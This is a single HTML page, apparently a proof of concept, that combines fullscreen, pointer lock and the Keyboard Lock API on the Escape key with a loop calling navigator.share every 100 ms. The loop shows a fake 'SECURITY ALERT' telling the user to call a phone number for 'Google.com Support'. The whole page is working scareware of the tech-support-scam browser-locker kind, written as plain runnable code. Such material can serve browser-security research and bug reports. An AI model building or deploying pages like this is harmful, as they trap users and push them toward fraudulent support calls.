<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Pointer Lock with Keyboard Lock and Fullscreen Example</title>
    <style>
      body {
        margin: 0;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f0f0f0;
      }
      canvas {
        border: 1px solid #000;
        cursor: pointer;
      }
      #status {
        margin-top: 20px;
        font-size: 18px;
        color: #333;
      }
      #esc-status {
        margin-top: 10px;
        font-size: 16px;
        color: #666;
      }
      #share-button {
        margin-top: 15px;
        padding: 10px 20px;
        font-size: 16px;
        background-color: #4CAF50;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s;
      }
      #share-button:hover {
        background-color: #45a049;
      }
      #share-button:disabled {
        background-color: #cccccc;
        cursor: not-allowed;
      }
      #share-status {
        margin-top: 10px;
        font-size: 14px;
        color: #999;
      }
    </style>
  </head>
  <body>
    <canvas id="canvas" width="800" height="600"></canvas>
    <div id="status">
      Click canvas to lock pointer & enter fullscreen. Press 'L' to toggle Esc
      lock.
    </div>
    <div id="esc-status">Esc Key: Unlocked</div>
    <button id="share-button">Start Share Navigation</button>
    <div id="share-status"></div>
    <script>
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");
      const escStatus = document.getElementById("esc-status");
      const shareButton = document.getElementById("share-button");
      const shareStatus = document.getElementById("share-status");
      let isEscLocked = false;
      let isFullscreen = false;
      let shareInterval = null;

      // Request pointer lock and fullscreen on click
      canvas.addEventListener("click", async () => {
        try {
          // Request fullscreen first
          await document.documentElement.requestFullscreen();
          isFullscreen = true;
          // Then pointer lock
          canvas.requestPointerLock =
            canvas.requestPointerLock ||
            canvas.mozRequestPointerLock ||
            canvas.webkitRequestPointerLock;
          canvas.requestPointerLock();
        } catch (err) {
          console.error("Failed to enter fullscreen or pointer lock:", err);
        }
      });

      // Handle share button click with 1 second delay
      shareButton.addEventListener("click", () => {
        if (shareInterval) {
          // Stop sharing
          clearInterval(shareInterval);
          shareInterval = null;
          shareButton.textContent = "Start Share Navigation";
          shareStatus.textContent = "";
          shareButton.disabled = false;
        } else {
          // Start sharing with 1 second delay
          shareButton.disabled = true;
          shareStatus.textContent = "Starting in 1 second...";
          
          setTimeout(() => {
            shareStatus.textContent = "Share navigation active";
            shareButton.textContent = "Stop Share Navigation";
            shareButton.disabled = false;
            
            shareInterval = setInterval(() => {
              if (navigator.share) {
                navigator.share({
                  title: '\u26A0 SECURITY ALERT \u26A0\nCall 123-456-7890 for Google.com Support',
                  text: 'Call 123-456-7890'
                }).catch(err => {
                  console.log("Share cancelled or failed:", err);
                });
              } else {
                console.log("Navigator.share not supported");
                clearInterval(shareInterval);
                shareInterval = null;
                shareButton.textContent = "Start Share Navigation";
                shareStatus.textContent = "Share API not supported in this browser";
              }
            }, 100);
          }, 1000); // 1 second delay
        }
      });

      // Handle pointer lock change
      document.addEventListener("pointerlockchange", lockChangeAlert, false);
      document.addEventListener("mozpointerlockchange", lockChangeAlert, false);
      document.addEventListener(
        "webkitpointerlockchange",
        lockChangeAlert,
        false
      );

      // Handle fullscreen change
      document.addEventListener(
        "fullscreenchange",
        fullscreenChangeAlert,
        false
      );
      document.addEventListener(
        "mozfullscreenchange",
        fullscreenChangeAlert,
        false
      );
      document.addEventListener(
        "webkitfullscreenchange",
        fullscreenChangeAlert,
        false
      );

      function lockChangeAlert() {
        if (
          document.pointerLockElement === canvas ||
          document.mozPointerLockElement === canvas ||
          document.webkitPointerLockElement === canvas
        ) {
          console.log("Pointer locked");
          document.addEventListener("mousemove", updatePosition, false);
          document.addEventListener("keydown", handleKeyDown, false);
        } else {
          console.log("Pointer unlocked");
          document.removeEventListener("mousemove", updatePosition, false);
          document.removeEventListener("keydown", handleKeyDown, false);
          if (isEscLocked) {
            unlockEsc();
          }
          // Exit fullscreen if pointer unlocks
          if (document.fullscreenElement) {
            document.exitFullscreen();
          }
        }
      }

      function fullscreenChangeAlert() {
        if (!document.fullscreenElement) {
          isFullscreen = false;
          console.log("Exited fullscreen");
          // Exit pointer lock if fullscreen exits
          if (document.pointerLockElement) {
            document.exitPointerLock();
          }
          if (isEscLocked) {
            unlockEsc();
          }
        }
      }

      // Track mouse movement
      let x = 400,
        y = 300;
      function updatePosition(e) {
        x += e.movementX;
        y += e.movementY;
        x = Math.max(0, Math.min(800, x));
        y = Math.max(0, Math.min(600, y));
        draw();
      }

      // Draw
      function draw() {
        ctx.clearRect(0, 0, 800, 600);
        ctx.fillStyle = "red";
        ctx.fillRect(x - 10, y - 10, 20, 20);
      }

      // Handle keydown
      async function handleKeyDown(e) {
        if (e.key === "l" || e.key === "L") {
          if (isEscLocked) {
            unlockEsc();
          } else {
            await lockEsc();
          }
        } else if (e.key === "Escape" && isEscLocked) {
          // Handle Esc press here if captured (e.g., do nothing or custom action)
          console.log("Esc pressed while locked - ignoring or handling custom");
          e.preventDefault(); // Try to prevent default, but won't stop browser exit
        }
      }

      // Lock Esc
      async function lockEsc() {
        try {
          if ("keyboard" in navigator && isFullscreen) {
            // Only lock in fullscreen
            await navigator.keyboard.lock(["Escape"]);
            isEscLocked = true;
            escStatus.textContent = "Esc Key: Locked";
            console.log("Esc key locked");
          } else {
            console.log("Keyboard Lock API not supported or not in fullscreen");
          }
        } catch (err) {
          console.error("Failed to lock Esc:", err);
        }
      }

      // Unlock Esc
      function unlockEsc() {
        if ("keyboard" in navigator) {
          navigator.keyboard.unlock();
          isEscLocked = false;
          escStatus.textContent = "Esc Key: Unlocked";
          console.log("Esc key unlocked");
        }
      }

      // Clean up on page unload
      window.addEventListener("beforeunload", () => {
        if (shareInterval) {
          clearInterval(shareInterval);
        }
      });

      draw();
    </script>
  </body>
</html>
